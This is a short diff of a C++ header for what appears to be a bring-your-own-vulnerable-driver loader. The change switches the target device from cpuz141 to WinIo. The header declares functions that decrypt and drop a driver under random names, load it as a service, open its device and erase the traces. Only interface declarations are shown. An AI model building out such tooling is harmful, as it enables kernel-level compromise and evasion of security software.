@@ -8,7 +8,7 @@ namespace byovd {
 
 // Context carried across BYOVD lifecycle.
 struct Context {
-    HANDLE device = INVALID_HANDLE_VALUE;   // \\.\cpuz141
+    HANDLE device = INVALID_HANDLE_VALUE;   // \\.\WinIo
     std::wstring file_path;                  // full path to dropped driver (no .sys)
     std::wstring basename;                   // 6-char random temp filename (no path, no ext)
     std::wstring service_name;               // 8-char random (registry key leaf)
@@ -25,7 +25,7 @@ bool decrypt_and_drop(const std::vector<uint8_t>& encrypted_blob, Context& ctx);
 // STATUS_IMAGE_ALREADY_LOADED (0xC000010E) treated as success.
 bool load_service(Context& ctx);
 
-// Opens \\.\cpuz141 device handle after the service has loaded.
+// Opens \\.\WinIo device handle after the service has loaded.
 bool open_device(Context& ctx);
 
 // Full teardown: CloseHandle -> NtUnloadDriver -> DeleteFileW -> RegDeleteTreeW.
